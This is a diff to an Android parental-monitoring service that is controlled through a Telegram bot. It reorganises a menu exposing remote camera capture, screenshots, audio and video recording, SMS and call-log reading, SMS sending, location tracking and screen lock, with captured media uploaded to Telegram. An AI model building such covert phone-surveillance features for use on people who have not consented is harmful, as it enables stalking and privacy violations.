@@ -263,6 +263,7 @@ class MonitoringService : Service() {
         private const val PAIR_NOTICE_COOLDOWN_MS = 600_000L
         private const val MUTATING_MAX_AGE_SEC = 300L
         private const val NUMBER_INPUT_TTL_MS = 300_000L
+        private val NO_MARKUP = com.redeye.parentalmonitor.network.InlineKeyboardMarkup(emptyList())
         private const val PING_RATE_WINDOW_MS = 120_000L
         private const val PING_RESTART_COOLDOWN_MS = 300_000L
         private const val VIDEO_BYTES_PER_SEC = 300_000L
@@ -1317,7 +1318,7 @@ class MonitoringService : Service() {
                     }
                     val ownerOk = isOwner(senderId)
                     if (chatOk || ownerOk) {
-                        val balasAngka = consumeNumberInput(rawText, message?.date ?: 0L, ownerOk, chatOk, senderId, msgChatId.isNotEmpty() && msgChatId == senderId)
+                        val balasAngka = consumePendingInput(rawText, message?.date ?: 0L, ownerOk, chatOk, senderId, msgChatId.isNotEmpty() && msgChatId == senderId)
                         if (!balasAngka && command.startsWith("/")) {
                             val aliasInput = resolveAliasInput(command, arg)
                             val input = aliasInput ?: if (arg.isEmpty()) command else "$command $arg"
@@ -1375,47 +1376,57 @@ class MonitoringService : Service() {
         try { answerCallback(query.id) } catch (_: Exception) { }
         if (dupCallback) return
         if (NetworkUtils.isAuthBlocked(preferencesManager)) return
-        val numTarget = query.data.orEmpty().removePrefix("num:")
-        if (numTarget != query.data.orEmpty()) {
-            if (!ownerOk) return
-            if (numTarget == "menu") {
-                sendToTelegram("\uD83D\uDD22 <b>Atur angka</b>\nTekan tombolnya, lalu balas angkanya. Balas <code>help</code> untuk keterangan.", numberInputMenu())
-            } else {
-                armNumberInput("/" + numTarget)
+        val aksi = com.redeye.parentalmonitor.utils.MenuCallback.parse(query.data.orEmpty()) ?: return
+        if (aksi is com.redeye.parentalmonitor.utils.MenuCallback.Navigate) {
+            if (!ownerOk && !(originChat.isNotEmpty() && originChat == chatId)) return
+            val layar = menuScreen(aksi.view)
+            val pesanId = try { query.message?.messageId ?: 0L } catch (_: Exception) { 0L }
+            if (aksi.editInPlace && pesanId > 0L) {
+                val targetChat = originChat.ifEmpty { chatId }
+                if (editMenuMessage(targetChat, pesanId, layar)) return
             }
+            sendToTelegram(layar.text, layar.markup)
             return
         }
-        val command = when (query.data) {
-            "photo" -> "/photo"
-            "location" -> "/location"
-            "lastcalls" -> "/lastcalls"
-            "lastsms" -> "/lastsms"
-            "battery" -> "/battery"
-            "status" -> "/status"
-            "stop" -> "/stop"
-            "resume" -> "/resume"
-            "camfront" -> "/camera depan"
-            "camback" -> "/camera belakang"
-            "pause60" -> "/pause 60"
-            "shot" -> "/screenshot"
-            "cekmati" -> "/cekmati"
-            "alive" -> "/alive"
-            else -> return
+        if (aksi is com.redeye.parentalmonitor.utils.MenuCallback.AskInput) {
+            if (!ownerOk) return
+            armInput("/" + aksi.command, aksi.view)
+            return
         }
+        val command = "/" + (aksi as com.redeye.parentalmonitor.utils.MenuCallback.Run).command
         val originOk = originChat.isNotEmpty() && originChat == chatId
         val pressedAt = try { query.message?.date ?: 0L } catch (_: Exception) { 0L }
         val gateCommand = command.substringBefore(" ")
-        if (pressedAt > 0L && (gateCommand in MUTATING_COMMANDS || gateCommand in SENSITIVE_COMMANDS)) {
-            val menuAge = System.currentTimeMillis() / 1000L - pressedAt
-            if (menuAge > MUTATING_MAX_AGE_SEC) {
+        if (gateCommand in MUTATING_COMMANDS || gateCommand in SENSITIVE_COMMANDS) {
+            if (pressedAt <= 0L || System.currentTimeMillis() / 1000L - pressedAt > MUTATING_MAX_AGE_SEC) {
                 if (ownerOk) sendToTelegram("\u231B Menu kedaluwarsa, ini yang baru.", mainMenu())
                 return
             }
-        } else if (pressedAt <= 0L && (gateCommand in MUTATING_COMMANDS || gateCommand in SENSITIVE_COMMANDS)) {
-            if (ownerOk) sendToTelegram("\u231B Menu kedaluwarsa, ini yang baru.", mainMenu())
-            return
         }
         handleTelegramCommand(command, pressedAt, ownerOk, originOk, sender, originChat.isNotEmpty() && originChat == sender)
+    }
+
+    private suspend fun editMenuMessage(chatId: String, messageId: Long, layar: MenuScreen): Boolean {
+        try {
+            if (chatId.isEmpty() || messageId <= 0L) return false
+            val botToken = try { preferencesManager.botToken } catch (_: Exception) { "" }
+            if (botToken.isEmpty() || !hasNetwork()) return false
+            val body = com.redeye.parentalmonitor.network.EditMessageRequest(
+                chatId = chatId,
+                messageId = messageId,
+                text = layar.text,
+                replyMarkup = layar.markup
+            )
+            val url = "https://api.telegram.org/bot${botToken}/editMessageText"
+            val response = TelegramClient.api.editMessageText(url, body)
+            if (response.isSuccessful && response.body()?.ok == true) return true
+            val galat = try { response.errorBody()?.string().orEmpty() } catch (_: Exception) { "" }
+            return galat.contains("not modified", ignoreCase = true)
+        } catch (e: kotlinx.coroutines.CancellationException) {
+            throw e
+        } catch (_: Exception) {
+            return false
+        }
     }
 
     private fun postAuthFailureReminder(code: Int) {
@@ -1577,21 +1588,118 @@ class MonitoringService : Service() {
         }
     }
 
+    private data class MenuScreen(
+        val text: String,
+        val markup: com.redeye.parentalmonitor.network.InlineKeyboardMarkup
+    )
+
     private fun mainMenu(): com.redeye.parentalmonitor.network.InlineKeyboardMarkup {
+        return menuScreen("main").markup
+    }
+
+    private fun quickMenuBar(): com.redeye.parentalmonitor.network.InlineKeyboardMarkup {
         fun button(text: String, data: String) =
             com.redeye.parentalmonitor.network.InlineButton(text, data)
         return com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
             listOf(
-                listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDCCD Lokasi", "location")),
-                listOf(button("\uD83D\uDCDE Panggilan", "lastcalls"), button("\uD83D\uDCAC SMS", "lastsms")),
-                listOf(button("\uD83D\uDCF7 Kamera depan", "camfront"), button("\uD83D\uDCF7 Kamera belakang", "camback")),
-                listOf(button("⏸️ Jeda 60 mnt", "pause60"), button("▶️ Lanjut", "resume")),
-                listOf(button("\uD83D\uDD0B Baterai", "battery"), button("\uD83D\uDCCA Status", "status")),
-                listOf(button("\uD83E\uDDEA Uji anti-mati", "cekmati"), button("\uD83D\uDC9A Hidup", "alive")),
-                listOf(button("\uD83D\uDDA5 Tangkap layar", "shot"), button("⏹️ Hentikan", "stop")),
-                listOf(button("\uD83D\uDD22 Atur angka", "num:menu"))
+                listOf(button("\uD83C\uDFE0 Menu utama", "menu:open"), button("\uD83D\uDD22 Atur angka", "menu:angka"))
             )
         )
+    }
+
+    private fun menuBarBody(): okhttp3.RequestBody {
+        return com.google.gson.Gson().toJson(quickMenuBar()).toRequestBody("text/plain".toMediaTypeOrNull())
+    }
+
+    private fun menuScreen(id: String): MenuScreen {
+        fun button(text: String, data: String) =
+            com.redeye.parentalmonitor.network.InlineButton(text, data)
+        fun papan(vararg baris: List<com.redeye.parentalmonitor.network.InlineButton>) =
+            com.redeye.parentalmonitor.network.InlineKeyboardMarkup(baris.toList())
+        val kembali = button("\u2B05\uFE0F Kembali", "m:main")
+        return when (id) {
+            "media" -> MenuScreen(
+                "\uD83D\uDCF7 <b>Foto &amp; rekam</b>\nPilih tindakan di bawah.",
+                papan(
+                    listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDDA5 Tangkap layar", "shot")),
+                    listOf(button("\uD83D\uDCF7 Kamera depan", "camfront"), button("\uD83D\uDCF7 Kamera belakang", "camback")),
+                    listOf(button("\uD83C\uDF99 Rekam audio", "num:media:record"), button("\uD83C\uDFAC Rekam video", "num:media:recordvideo")),
+                    listOf(kembali)
+                )
+            )
+            "lokasi" -> MenuScreen(
+                "\uD83D\uDCCD <b>Lokasi &amp; jejak</b>\nGeofence rumah/sekolah + jemput.",
+                papan(
+                    listOf(button("\uD83D\uDCCD Lokasi", "location"), button("\uD83E\uDDB6 Jejak hari ini", "x:jejak")),
+                    listOf(button("\uD83C\uDFE0 Jemput", "num:lokasi:jemput"), button("\uD83D\uDE97 Kendara", "x:kendara status")),
+                    listOf(button("\uD83D\uDDFA\uFE0F Rumah", "i:lokasi:home"), button("\uD83C\uDFEB Sekolah", "i:lokasi:school")),
+                    listOf(kembali)
+                )
+            )
+            "komu" -> MenuScreen(
+                "\uD83D\uDCDE <b>Komunikasi</b>\nPanggilan, SMS, kontak, notifikasi.",
+                papan(
+                    listOf(button("\uD83D\uDCDE Panggilan", "lastcalls"), button("\uD83D\uDCAC SMS terakhir", "lastsms")),
+                    listOf(button("\u2709\uFE0F Kirim SMS", "i:komu:sms"), button("\u2705 SMS tertunda", "x:smsconfirm")),
+                    listOf(button("\uD83D\uDD14 Notifikasi", "x:notif status"), button("\uD83D\uDCE8 Notif terakhir", "x:lastnotif")),
+                    listOf(button("\uD83D\uDC65 Cari kontak", "i:komu:contacts"), button("\uD83D\uDCE6 Aplikasi", "x:apps")),
+                    listOf(button("\uD83D\uDCDC Riwayat nomor", "i:komu:history")),
+                    listOf(kembali)
+                )
+            )
+            "info" -> MenuScreen(
+                "\uD83D\uDCCA <b>Info &amp; data</b>\nStatus, izin, penyimpanan.",
+                papan(
+                    listOf(button("\uD83D\uDCCA Status", "status"), button("\uD83D\uDCCB Ringkas", "x:ringkas")),
+                    listOf(button("\uD83D\uDD0B Baterai", "battery"), button("\u23F1\uFE0F Uptime", "x:uptime")),
+                    listOf(button("\u2139\uFE0F Versi", "x:version"), button("\uD83D\uDD10 Izin", "x:perms")),
+                    listOf(button("\uD83D\uDCBE Penyimpanan", "x:storage"), button("\uD83D\uDCC8 Pemakaian layar", "i:info:layar")),
+                    listOf(button("\uD83D\uDC93 Hidup", "alive"), button("\uD83E\uDDEA Uji anti-mati", "cekmati")),
+                    listOf(kembali)
+                )
+            )
+            "pantau" -> MenuScreen(
+                "\uD83D\uDEE1\uFE0F <b>Pengawasan</b>\nTombol nyala/mati langsung jalan.",
+                papan(
+                    listOf(button("\uD83D\uDEB6 Patroli nyala", "x:patrol on"), button("\uD83D\uDEB6 Patroli mati", "x:patrol off")),
+                    listOf(button("\uD83C\uDF19 Malam nyala", "x:night on"), button("\uD83C\uDF19 Malam mati", "x:night off")),
+                    listOf(button("\uD83D\uDD24 Awasi kata", "i:pantau:watch"), button("\uD83D\uDCF5 Awasi nomor", "i:pantau:watchnomor")),
+                    listOf(button("\uD83D\uDD58 Jam pulang", "i:pantau:jampulang"), button("\uD83D\uDCF6 Hemat data", "x:hematdata status")),
+                    listOf(button("\uD83D\uDCCA Kewaspadaan", "x:waspada"), button("\uD83C\uDD98 HP hilang", "x:hilang")),
+                    listOf(button("\uD83D\uDC9A Pemulihan", "x:sembuh"), kembali)
+                )
+            )
+            "alat" -> MenuScreen(
+                "⚙️ <b>Alat &amp; kontrol</b>\nJeda, kunci, restart, antrean.",
+                papan(
+                    listOf(button("⏸️ Jeda 60 mnt", "pause60"), button("▶️ Lanjut", "resume")),
+                    listOf(button("\uD83D\uDD12 Kunci layar", "x:lock"), button("\uD83D\uDD14 Bunyi HP", "num:alat:ring")),
+                    listOf(button("\uD83D\uDD04 Restart", "x:restart"), button("\uD83D\uDE80 Kirim antrean", "x:flush")),
+                    listOf(button("\uD83D\uDDD1\uFE0F Buang antrean", "x:clearqueue"), button("\u23F9\uFE0F Hentikan", "stop")),
+                    listOf(button("\uD83D\uDD22 Atur angka", "m:angka"), kembali)
+                )
+            )
+            "angka" -> MenuScreen(
+                "\uD83D\uDD22 <b>Atur angka</b>\nTekan tombolnya, lalu balas angkanya. Balas <code>help</code> untuk keterangan.",
+                com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
+                    numberInputs.chunked(2).map { baris ->
+                        baris.map { button(it.button, "num:" + it.command.removePrefix("/")) }
+                    } + listOf(listOf(kembali))
+                )
+            )
+            else -> MenuScreen(
+                "\uD83E\uDD16 <b>Menu utama</b>\nPilih tombol cepat, atau buka kategori di bawah.",
+                papan(
+                    listOf(button("\uD83D\uDCF8 Foto", "photo"), button("\uD83D\uDDA5 Tangkap layar", "shot")),
+                    listOf(button("\uD83D\uDCCD Lokasi", "location"), button("\uD83D\uDCCA Status", "status")),
+                    listOf(button("\uD83D\uDD0B Baterai", "battery"), button("\uD83D\uDEA8 Darurat", "x:darurat")),
+                    listOf(button("\uD83D\uDCF7 Foto &amp; rekam", "m:media"), button("\uD83D\uDCDE Komunikasi", "m:komu")),
+                    listOf(button("\uD83D\uDDFA\uFE0F Lokasi &amp; jejak", "m:lokasi"), button("\uD83D\uDCCA Info &amp; data", "m:info")),
+                    listOf(button("\uD83D\uDEE1\uFE0F Pengawasan", "m:pantau"), button("⚙️ Alat &amp; kontrol", "m:alat")),
+                    listOf(button("\uD83D\uDD22 Atur angka", "m:angka"))
+                )
+            )
+        }
     }
 
     private data class NumberInput(
@@ -1616,22 +1724,57 @@ class MonitoringService : Service() {
     )
 
     @Volatile
-    private var pendingNumberCommand = ""
+    private var pendingInputCommand = ""
 
     @Volatile
-    private var pendingNumberAt = 0L
+    private var pendingInputAt = 0L
 
     private fun numberInputFor(command: String): NumberInput? {
         val head = command.trim().substringBefore(" ").lowercase(java.util.Locale.ROOT)
         return numberInputs.firstOrNull { it.command == head }
     }
 
-    private fun numberInputMenu(): com.redeye.parentalmonitor.network.InlineKeyboardMarkup {
-        return com.redeye.parentalmonitor.network.InlineKeyboardMarkup(
-            numberInputs.chunked(2).map { baris ->
-                baris.map { com.redeye.parentalmonitor.network.InlineButton(it.button, "num:" + it.command.removePrefix("/")) }
-            }
-        )
+    private data class TextInput(
+        val command: String,
+        val view: String,
+        val prompt: String,
+        val example: String,
+        val note: String
+    )
+
+    private val textInputs = listOf(
+        TextInput("/sms", "komu", "Kirim <b>nomor</b> lalu <b>isi pesannya</b>.", "08123456789 Halo", "Kirim SMS dari HP ini. Nomor minimal 7 digit."),
+        TextInput("/contacts", "komu", "Kirim nama atau sebagian nama kontak.", "budi", "Cari kontak di HP (butuh izin Kontak)."),
+        TextInput("/history", "komu", "Kirim nomor telepon (7-20 digit).", "08123456789", "Tampilkan 5 panggilan + 5 SMS terakhir nomor itu."),
+        TextInput("/layar", "info", "Kirim jumlah jam 1-24, atau ketik apa saja untuk 24 jam.", "6", "Ringkasan pemakaian layar per aplikasi."),
+        TextInput("/watch", "pantau", "Kirim kata yang diawasi (pisahkan koma, min 3 huruf).", "judol,pinjol", "Pantau kata terlarang. Ketik /watch off untuk mematikan."),
+        TextInput("/watchnomor", "pantau", "Kirim nomor yang diawasi (pisahkan koma, min 7 digit).", "08123456789", "Kabar bila nomor itu muncul. Ketik /watchnomor off untuk mematikan."),
+        TextInput("/jampulang", "pantau", "Kirim jam format HH:MM.", "21:30", "Kabar bila di luar rumah lewat jam itu. Ketik /jampulang off untuk mematikan."),
+        TextInput("/home", "lokasi", "Kirim lat,lon,radius (radius 50-5000 m).", "-6.2,106.8,200", "Geofence rumah. Ketik /home off untuk mematikan, /home untuk status."),
+        TextInput("/school", "lokasi", "Kirim lat,lon,radius (radius 50-5000 m).", "-6.2,106.8,300", "Geofence sekolah. Ketik /school off untuk mematikan, /school untuk status.")
+    )
+
+    private fun textInputFor(command: String): TextInput? {
+        val head = command.trim().substringBefore(" ").lowercase(java.util.Locale.ROOT)
+        return textInputs.firstOrNull { it.command == head }
+    }
+
+    private fun textInputPrompt(input: TextInput): String {
+        return buildString {
+            appendLine("\u270F\uFE0F <b>" + input.command + "</b>")
+            appendLine(input.prompt)
+            appendLine("Contoh: <code>" + input.example + "</code>")
+            appendLine("Balas <code>help</code> untuk keterangan tombol ini.")
+        }.trim()
+    }
+
+    private fun textInputHelp(input: TextInput): String {
+        return buildString {
+            appendLine("\u2139\uFE0F <b>" + input.command + "</b>")
+            appendLine(input.note)
+            appendLine("Pakai: <code>" + input.command + " ...</code>")
+            appendLine("Contoh: <code>" + input.command + " " + input.example + "</code>")
+        }.trim()
     }
 
     private fun numberInputCurrent(input: NumberInput): String {
@@ -1701,42 +1844,62 @@ class MonitoringService : Service() {
         }
     }
 
-    private suspend fun armNumberInput(command: String) {
-        val input = numberInputFor(command) ?: return
-        pendingNumberCommand = input.command
-        pendingNumberAt = System.currentTimeMillis()
-        sendToTelegram(numberInputPrompt(input), numberInputMenu())
+    private suspend fun armInput(command: String, view: String) {
+        val angka = numberInputFor(command)
+        if (angka != null) {
+            pendingInputCommand = angka.command
+            pendingInputAt = System.currentTimeMillis()
+            val layar = com.redeye.parentalmonitor.utils.MenuCallback.viewName(view.ifEmpty { "angka" })
+            sendToTelegram(numberInputPrompt(angka), menuScreen(layar).markup)
+            return
+        }
+        val teks = textInputFor(command) ?: return
+        pendingInputCommand = teks.command
+        pendingInputAt = System.currentTimeMillis()
+        val layar = com.redeye.parentalmonitor.utils.MenuCallback.viewName(view.ifEmpty { teks.view })
+        sendToTelegram(textInputPrompt(teks), menuScreen(layar).markup)
     }
 
-    private suspend fun consumeNumberInput(text: String, sentAtSec: Long, ownerOk: Boolean, chatOk: Boolean, senderId: String, privateChat: Boolean): Boolean {
-        val pending = pendingNumberCommand
+    private suspend fun consumePendingInput(text: String, sentAtSec: Long, ownerOk: Boolean, chatOk: Boolean, senderId: String, privateChat: Boolean): Boolean {
+        val pending = pendingInputCommand
         if (pending.isEmpty()) return false
-        if (System.currentTimeMillis() - pendingNumberAt > NUMBER_INPUT_TTL_MS) {
-            pendingNumberCommand = ""
+        if (System.currentTimeMillis() - pendingInputAt > NUMBER_INPUT_TTL_MS) {
+            pendingInputCommand = ""
             return false
         }
         val bersih = text.trim()
         if (bersih.isEmpty()) return false
         if (bersih.startsWith("/")) {
-            pendingNumberCommand = ""
+            pendingInputCommand = ""
             return false
         }
-        val input = numberInputFor(pending)
-        if (input == null) {
-            pendingNumberCommand = ""
-            return false
-        }
-        if (bersih.equals("help", ignoreCase = true) || bersih.equals("bantuan", ignoreCase = true) || bersih == "?" || bersih.equals("cara", ignoreCase = true)) {
-            sendToTelegram(numberInputHelp(input))
+        val mintaHelp = bersih.equals("help", ignoreCase = true) || bersih.equals("bantuan", ignoreCase = true) || bersih == "?" || bersih.equals("cara", ignoreCase = true)
+        val angka = numberInputFor(pending)
+        if (angka != null) {
+            if (mintaHelp) {
+                sendToTelegram(numberInputHelp(angka))
+                return true
+            }
+            val nilai = com.redeye.parentalmonitor.utils.NumberReply.parse(bersih)
+            if (nilai == null) {
+                sendToTelegram("Kirim angkanya saja, contoh <code>" + numberInputExample(angka) + "</code>.\nBalas <code>help</code> untuk keterangan.", menuScreen("angka").markup)
+                return true
+            }
+            pendingInputCommand = ""
+            handleTelegramCommand(angka.command + " " + nilai, sentAtSec, ownerOk, chatOk, senderId, privateChat)
             return true
         }
-        val angka = com.redeye.parentalmonitor.utils.NumberReply.parse(bersih)
-        if (angka == null) {
-            pendingNumberCommand = ""
+        val teks = textInputFor(pending)
+        if (teks == null) {
+            pendingInputCommand = ""
             return false
         }
-        pendingNumberCommand = ""
-        handleTelegramCommand(input.command + " " + angka, sentAtSec, ownerOk, chatOk, senderId, privateChat)
+        if (mintaHelp) {
+            sendToTelegram(textInputHelp(teks))
+            return true
+        }
+        pendingInputCommand = ""
+        handleTelegramCommand(teks.command + " " + bersih, sentAtSec, ownerOk, chatOk, senderId, privateChat)
         return true
     }
 
@@ -1788,12 +1951,13 @@ class MonitoringService : Service() {
         }
         val numberInput = numberInputFor(command)
         if (numberInput != null && numberInput.required && arg.isBlank()) {
-            armNumberInput(numberInput.command)
+            armInput(numberInput.command, "angka")
             return
         }
         when (command) {
             "/tombol", "/angka" -> {
-                sendToTelegram("\uD83D\uDD22 <b>Atur angka</b>\nTekan tombolnya, lalu balas angkanya. Balas <code>help</code> untuk keterangan.", numberInputMenu())
+                val layar = menuScreen("angka")
+                sendToTelegram(layar.text, layar.markup)
             }
             "/photo" -> handlePhotoCommand(arg)
             "/screenshot" -> {
@@ -1995,7 +2159,8 @@ class MonitoringService : Service() {
             )
             return
         }
-        sendToTelegram("\uD83D\uDC46 <b>Ketuk tombol di bawah</b>", mainMenu())
+        val layar = menuScreen("main")
+        sendToTelegram(layar.text, layar.markup)
     }
 
 
@@ -3744,7 +3909,7 @@ class MonitoringService : Service() {
         var lastSentIdx = -1
         try {
             for ((idx, chunk) in chunks.withIndex()) {
-                val markup = if (idx == chunks.lastIndex) replyMarkup else null
+                val markup = if (idx == chunks.lastIndex) replyMarkup else NO_MARKUP
                 if (!sendToTelegram(chunk, markup, false)) {
                     ok = false
                     failed.add(chunk)
@@ -3877,7 +4042,7 @@ class MonitoringService : Service() {
                 chatId = chatId,
                 text = message,
                 parseMode = "HTML",
-                replyMarkup = replyMarkup
+                replyMarkup = replyMarkup ?: quickMenuBar()
             )
 
             val url = "https://api.telegram.org/bot${botToken}/sendMessage"
@@ -6823,7 +6988,7 @@ class MonitoringService : Service() {
             val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
             val caption = ("\uD83C\uDF99\uFE0F " + TimeFmt.full(System.currentTimeMillis())).toRequestBody("text/plain".toMediaTypeOrNull())
             val url = "https://api.telegram.org/bot$botToken/sendAudio"
-            val response = TelegramMediaClient.api.sendAudio(url, chatIdBody, caption, audioPart)
+            val response = TelegramMediaClient.api.sendAudio(url, chatIdBody, caption, audioPart, menuBarBody())
             if (response.isSuccessful && response.body()?.ok == true) {
                 noteSendOk()
                 deleteQuietly(audioFile)
@@ -7002,7 +7167,7 @@ class MonitoringService : Service() {
             val chatIdBody = chatId.toRequestBody("text/plain".toMediaTypeOrNull())
             val caption = ("🎥 " + TimeFmt.full(System.currentTimeMillis())).toRequestBody("text/plain".toMediaTypeOrNull())
             val url = "https://api.telegram.org/bot$botToken/sendVideo"
-            val response = TelegramMediaClient.api.sendVideo(url, chatIdBody, caption, videoPart)
+            val response = TelegramMediaClient.api.sendVideo(url, chatIdBody, caption, videoPart, menuBarBody())
             if (response.isSuccessful && response.body()?.ok == true) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "✓ Video sent successfully!")
                 noteSendOk()
@@ -7348,7 +7513,7 @@ class MonitoringService : Service() {
 
             val url = "https://api.telegram.org/bot$botToken/sendPhoto"
 
-            val response = TelegramMediaClient.api.sendPhoto(url, chatIdBody, caption, photoPart)
+            val response = TelegramMediaClient.api.sendPhoto(url, chatIdBody, caption, photoPart, menuBarBody())
 
             if (response.isSuccessful && response.body()?.ok == true) {
                 if (com.redeye.parentalmonitor.BuildConfig.DEBUG) android.util.Log.i("MonitoringService", "✓ Photo sent successfully!")
